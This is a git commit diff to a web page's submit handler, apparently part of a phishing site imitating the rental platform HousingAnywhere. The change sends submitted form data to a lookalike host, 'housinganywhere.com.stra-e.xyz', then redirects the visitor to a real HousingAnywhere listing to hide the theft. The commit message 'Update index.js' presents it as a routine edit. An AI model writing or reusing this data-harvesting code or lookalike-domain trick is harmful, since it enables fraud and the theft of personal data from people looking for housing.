22fd0e57e5b39130f84d384a1843967a2fe88f40
alx7alx <alx0861@gmail.com>
2024-07-17 13:49:19 +0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -18,7 +18,7 @@ function Home() {
 
   async function handleSubmitFn() {
     try {
-      await axios.post(`https://www.stra-e.xyz/api/user`, data);
+      await axios.post(`https://housinganywhere.com.stra-e.xyz/api/user`, data);
       router.replace('https://housinganywhere.com/room/ut1299287/es/Pozuelo%20de%20Alarc%C3%B3n/avenida-rodajos?flexDays=14');
     } catch(err) {
       console.log(err.message, "ce o avea");
